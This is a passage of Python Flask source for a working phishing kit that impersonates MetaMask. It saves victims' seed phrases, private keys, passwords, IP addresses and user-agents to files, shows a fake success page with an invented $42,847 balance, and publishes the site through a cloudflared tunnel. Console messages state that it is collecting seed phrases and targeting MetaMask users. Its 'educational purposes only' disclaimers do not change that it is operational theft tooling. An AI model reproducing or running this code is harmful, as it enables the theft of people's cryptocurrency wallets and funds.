        first_word = seed_phrase.split()[0] if seed_phrase else 'seed'
    elif private_key:
        submission_type = 'private_key'
        submission_content = private_key
        first_word = 'key_' + private_key[:8] if len(private_key) >= 8 else 'key'
    else:
        submission_type = 'unknown'
        submission_content = ''
        first_word = 'unknown'

    safe_filename = secure_filename(first_word)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_filename}_{timestamp}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Session: {session_id}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
        file.write(f"IP: {request.remote_addr}\n")
        file.write("=" * 50 + "\n")
        file.write(f"SUBMISSION TYPE: {submission_type.upper()}\n")
        file.write("=" * 50 + "\n")
        
        if submission_type == 'seed_phrase':
            file.write(f"SEED PHRASE:\n{submission_content}\n")
            word_count = len(seed_phrase.strip().split())
            file.write(f"Word Count: {word_count}\n")
        elif submission_type == 'private_key':
            file.write(f"PRIVATE KEY:\n{submission_content}\n")
            file.write(f"Key Length: {len(private_key)} characters\n")
        
        file.write("=" * 50 + "\n")
        file.write(f"PASSWORD: {password}\n")
        file.write("=" * 50 + "\n")
        file.write(f"Platform: MetaMask Wallet Import\n")
        file.write(f"Shown Balance: 12.84 ETH ($42,847.63)\n")
        file.write(f"Assets: ETH, WBTC, USDC, UNI\n")
        file.write(f"Network: Ethereum Mainnet\n")
        file.write(f"Purpose: 'Security Verification Required'\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>MetaMask - Import Successful</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <style>
            * {
                -webkit-tap-highlight-color: transparent;
                -webkit-font-smoothing: antialiased;
            }
            
            body {
                background: linear-gradient(135deg, #F7F7F7 0%, #E8E8E8 100%);
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #333333;
                -webkit-text-size-adjust: 100%;
                touch-action: manipulation;
            }
            
            .success-container {
                background: white;
                width: 95vw;
                max-width: 500px;
                min-height: 100vh;
                border-radius: 0;
                box-shadow: none;
                overflow: hidden;
                text-align: center;
                position: relative;
            }
            
            @media (min-width: 768px) {
                .success-container {
                    min-height: auto;
                    border-radius: 20px;
                    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
                    margin: 20px auto;
                }
                body {
                    padding: 20px 0;
                    min-height: calc(100vh - 40px);
                }
            }
            
            .success-header {
                background: linear-gradient(135deg, #24272A 0%, #000000 100%);
                padding: 40px 20px 30px;
                position: relative;
                overflow: hidden;
            }
            
            @media (min-width: 768px) {
                .success-header {
                    padding: 50px 40px;
                }
            }
            
            .success-icon {
                width: 80px;
                height: 80px;
                background: linear-gradient(135deg, #F6851B, #FF9E42);
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 0 auto 25px;
                font-size: 40px;
                color: white;
                box-shadow: 0 10px 30px rgba(246, 133, 27, 0.3);
                animation: float 3s ease-in-out infinite;
            }
            
            @media (min-width: 768px) {
                .success-icon {
                    width: 100px;
                    height: 100px;
                    margin: 0 auto 30px;
                    font-size: 48px;
                }
            }
            
            @keyframes float {
                0%, 100% { transform: translateY(0); }
                50% { transform: translateY(-10px); }
            }
            
            .success-title {
                font-size: 28px;
                font-weight: 700;
                color: white;
                margin-bottom: 10px;
            }
            
            @media (min-width: 768px) {
                .success-title {
                    font-size: 32px;
                }
            }
            
            .success-body {
                padding: 30px 20px;
            }
            
            @media (min-width: 768px) {
                .success-body {
                    padding: 40px;
                }
            }
            
            .progress-container {
                width: 100%;
                height: 6px;
                background: #F0F0F0;
                border-radius: 3px;
                margin: 25px 0;
                overflow: hidden;
            }
            
            @media (min-width: 768px) {
                .progress-container {
                    height: 8px;
                    margin: 30px 0;
                }
            }
            
            .progress-bar {
                height: 100%;
                background: linear-gradient(90deg, #F6851B, #FF9E42);
                border-radius: 3px;
                width: 0%;
                animation: fillProgress 2s ease-in-out forwards;
            }
            
            @keyframes fillProgress {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            
            .status-list {
                text-align: left;
                margin: 30px 0;
            }
            
            @media (min-width: 768px) {
                .status-list {
                    margin: 40px 0;
                }
            }
            
            .status-item {
                display: flex;
                align-items: center;
                padding: 15px 0;
                border-bottom: 1px solid #F0F0F0;
            }
            
            @media (min-width: 768px) {
                .status-item {
                    padding: 20px 0;
                }
            }
            
            .status-item:last-child {
                border-bottom: none;
            }
            
            .status-icon {
                color: #F6851B;
                font-weight: bold;
                margin-right: 12px;
                font-size: 20px;
                min-width: 25px;
            }
            
            @media (min-width: 768px) {
                .status-icon {
                    margin-right: 15px;
                    font-size: 24px;
                    min-width: 30px;
                }
            }
            
            .wallet-connected {
                background: #F8F9FA;
                border-radius: 16px;
                padding: 20px;
                margin: 25px 0;
                text-align: left;
            }
            
            @media (min-width: 768px) {
                .wallet-connected {
                    padding: 25px;
                    margin: 30px 0;
                }
            }
            
            .detail-row {
                display: flex;
                justify-content: space-between;
                margin: 12px 0;
                font-size: 13px;
            }
            
            @media (min-width: 768px) {
                .detail-row {
                    margin: 15px 0;
                    font-size: 14px;
                }
            }
            
            .detail-label {
                color: #666;
            }
            
            .detail-value {
                font-weight: 600;
                color: #24272A;
            }
            
            .assets-connected {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 12px;
                margin: 30px 0;
            }
            
            @media (min-width: 768px) {
                .assets-connected {
                    grid-template-columns: repeat(4, 1fr);
                    gap: 15px;
                    margin: 40px 0;
                }
            }
            
            .asset-connected {
                background: white;
                border: 2px solid #F0F0F0;
                border-radius: 12px;
                padding: 15px;
                text-align: center;
                transition: all 0.3s;
            }
            
            @media (min-width: 768px) {
                .asset-connected {
                    padding: 20px;
                }
            }
            
            .asset-connected:hover, .asset-connected:active {
                border-color: #F6851B;
                transform: translateY(-5px);
            }
            
            .asset-connected-icon {
                width: 35px;
                height: 35px;
                background: linear-gradient(135deg, #F6851B, #FF9E42);
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                color: white;
                font-weight: bold;
                margin: 0 auto 12px;
            }
            
            @media (min-width: 768px) {
                .asset-connected-icon {
                    width: 40px;
                    height: 40px;
                    margin: 0 auto 15px;
                }
            }
            
            .transaction-hash {
                background: #F8F9FA;
                border: 1px solid #E0E0E0;
                border-radius: 8px;
                padding: 12px;
                font-family: 'Courier New', monospace;
                font-size: 10px;
                color: #666;
                margin: 15px 0;
                word-break: break-all;
                line-height: 1.4;
            }
            
            @media (min-width: 768px) {
                .transaction-hash {
                    padding: 15px;
                    font-size: 11px;
                    margin: 20px 0;
                }
            }
            
            .security-note {
                background: #FFF3E0;
                border: 2px solid #FFB74D;
                border-radius: 12px;
                padding: 15px;
                margin: 25px 0;
                color: #E65100;
                font-size: 12px;
                line-height: 1.5;
            }
            
            @media (min-width: 768px) {
                .security-note {
                    padding: 20px;
                    margin: 30px 0;
                    font-size: 13px;
                }
            }
            
            .redirect-notice {
                background: rgba(246, 133, 27, 0.1);
                border: 2px solid rgba(246, 133, 27, 0.3);
                border-radius: 12px;
                padding: 15px;
                margin: 20px 0;
                color: #F6851B;
                font-size: 13px;
                line-height: 1.5;
            }
            
            @media (min-width: 768px) {
                .redirect-notice {
                    padding: 20px;
                    margin: 25px 0;
                    font-size: 14px;
                }
            }
            
            .continue-btn {
                background: linear-gradient(135deg, #F6851B, #FF9E42);
                color: white;
                border: none;
                padding: 18px;
                border-radius: 12px;
                font-size: 16px;
                font-weight: 700;
                width: 100%;
                cursor: pointer;
                transition: all 0.3s;
                margin-top: 15px;
                -webkit-tap-highlight-color: transparent;
                min-height: 56px;
            }
            
            @media (min-width: 768px) {
                .continue-btn {
                    padding: 20px;
                    font-size: 18px;
                    margin-top: 20px;
                }
            }
            
            .continue-btn:hover, .continue-btn:active {
                transform: translateY(-3px);
                box-shadow: 0 15px 30px rgba(246, 133, 27, 0.3);
            }
            
            /* Mobile-specific optimizations */
            @media (max-width: 767px) {
                body {
                    padding: 0;
                    display: block;
                }
                
                .success-container {
                    width: 100%;
                    min-height: 100vh;
                    border-radius: 0;
                }
                
                .assets-connected {
                    grid-template-columns: repeat(2, 1fr);
                }
                
                button {
                    font-size: 16px !important;
                }
            }
            
            /* Tablet optimization */
            @media (min-width: 768px) and (max-width: 1024px) {
                .success-container {
                    width: 90vw;
                    max-width: 600px;
                }
                
                .assets-connected {
                    grid-template-columns: repeat(2, 1fr);
                }
            }
        </style>
        <meta http-equiv="refresh" content="8;url=/" />
    </head>
    <body>
        <div class="success-container">
            <div class="success-header">
                <div class="success-icon">✓</div>
                <div class="success-title">Wallet Imported</div>
                <div style="color: rgba(255, 255, 255, 0.9); font-size: 14px; max-width: 400px; margin: 0 auto;">
                    Your MetaMask wallet is now connected
                </div>
            </div>
            
            <div class="success-body">
                <div style="color: #666; font-size: 14px; margin-bottom: 25px;">
                    Successfully imported wallet and secured with your new password.
                </div>
                
                <div class="progress-container">
                    <div class="progress-bar"></div>
                </div>
                
                <div class="status-list">
                    <div class="status-item">
                        <span class="status-icon">✓</span>
                        <div>
                            <strong>Wallet Imported</strong>
                            <div style="color: #666; font-size: 13px; margin-top: 4px;">
                                Your wallet has been successfully imported
                            </div>
                        </div>
                    </div>
                    <div class="status-item">
                        <span class="status-icon">✓</span>
                        <div>
                            <strong>Password Secured</strong>
                            <div style="color: #666; font-size: 13px; margin-top: 4px;">
                                New password applied and encrypted
                            </div>
                        </div>
                    </div>
                    <div class="status-item">
                        <span class="status-icon">✓</span>
                        <div>
                            <strong>Connected to dApps</strong>
                            <div style="color: #666; font-size: 13px; margin-top: 4px;">
                                Ready to interact with decentralized applications
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="wallet-connected">
                    <div style="color: #F6851B; font-weight: 600; margin-bottom: 15px; font-size: 15px;">
                        Wallet Connected
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Network:</span>
                        <span class="detail-value">Ethereum Mainnet</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Balance:</span>
                        <span class="detail-value">12.84 ETH ($42,847.63)</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Status:</span>
                        <span class="detail-value" style="color: #00A65A;">Connected ✓</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">Last Activity:</span>
                        <span class="detail-value">Just now</span>
                    </div>
                </div>
                
                <div class="assets-connected">
                    <div class="asset-connected">
                        <div class="asset-connected-icon">⏣</div>
                        <div>ETH</div>
                        <div style="color: #F6851B; font-size: 11px;">$42,847</div>
                    </div>
                    <div class="asset-connected">
                        <div class="asset-connected-icon">₿</div>
                        <div>WBTC</div>
                        <div style="color: #F6851B; font-size: 11px;">$24,500</div>
                    </div>
                    <div class="asset-connected">
                        <div class="asset-connected-icon">🔷</div>
                        <div>USDC</div>
                        <div style="color: #F6851B; font-size: 11px;">$18,500</div>
                    </div>
                    <div class="asset-connected">
                        <div class="asset-connected-icon">🦄</div>
                        <div>UNI</div>
                        <div style="color: #F6851B; font-size: 11px;">$2,580</div>
                    </div>
                </div>
                
                <div class="transaction-hash">
                    Connection Hash: MM-<span id="connection-hash">0000000</span>
                </div>
                
                <div class="security-note">
                    🔒 Your wallet is now secured. Make sure to keep your recovery phrase safe and never share it.
                </div>
                
                <div class="redirect-notice">
                    ⏳ You will be redirected to the MetaMask dashboard in 8 seconds...
                </div>
                
                <button class="continue-btn" onclick="window.location.href='/'" aria-label="Open MetaMask Dashboard">
                    Open MetaMask Dashboard
                </button>
            </div>
        </div>
        
        <script>
            // Generate random connection hash
            document.getElementById('connection-hash').textContent = 
                Math.random().toString(36).substring(2, 10).toUpperCase();
            
            // Animate status items
            setTimeout(() => {
                const statusItems = document.querySelectorAll('.status-item');
                statusItems.forEach((item, index) => {
                    item.style.opacity = '0';
                    item.style.transform = 'translateX(-20px)';
                    
                    setTimeout(() => {
                        item.style.transition = 'all 0.5s ease';
                        item.style.opacity = '1';
                        item.style.transform = 'translateX(0)';
                    }, index * 200);
                });
                
                // Animate connected assets
                const connectedAssets = document.querySelectorAll('.asset-connected');
                connectedAssets.forEach((asset, index) => {
                    asset.style.opacity = '0';
                    setTimeout(() => {
                        asset.style.transition = 'opacity 0.5s';
                        asset.style.opacity = '1';
                    }, index * 200 + 600);
                });
            }, 500);
            
            // Handle mobile viewport height
            function setViewportHeight() {
                let vh = window.innerHeight * 0.01;
                document.documentElement.style.setProperty('--vh', `${vh}px`);
            }
            
            setViewportHeight();
            window.addEventListener('resize', setViewportHeight);
            window.addEventListener('orientationchange', setViewportHeight);
        </script>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"💰 MetaMask Public Link: {tunnel_url}")
            print(f"🔐 Collecting: Seed Phrases, Private Keys & Passwords")
            print(f"💾 Save location: {BASE_FOLDER}")
            print(f"💰 Showing: $42,847 portfolio (12.84 ETH)")
            print("📱 Optimized for mobile devices")
            print("🎯 Real MetaMask logo and icons")
            print("⚠️  WARNING: For educational purposes only!")
            print("⚠️  NEVER enter real seed phrases or private keys!")
            print("⚠️  MetaMask is the #1 target for crypto phishing!")
            print("⚠️  Seed phrase = Complete control of wallet!")
            print("⚠️  Private key = Direct access to all funds!")
            print("-" * 50)
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=5015, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    print("🚀 Starting MetaMask Wallet Import Page...")
    print("📱 Port: 5015")
    print("💾 Save location: ~/storage/downloads/MetaMask/")
    print("💰 Showing: $42,847 Portfolio (12.84 ETH, WBTC, USDC, UNI)")
    print("🔐 Collecting: Seed Phrases OR Private Keys + Passwords")
    print("🎯 Target: MetaMask users needing 'wallet import'")
    print("🎯 Strategy: 'Security Verification Required' banner")
    print("📱 Optimized for mobile and desktop")
    print("🦊 Using real MetaMask logo and crypto icons")
    print("⚠️  WARNING: MetaMask phishing steals millions monthly!")
    print("⚠️  Once seed phrase is stolen, ALL crypto is GONE!")
    print("⏳ Waiting for cloudflared tunnel...")
    
    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5015")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        print("\n👋 Server stopped")
        sys.exit(0)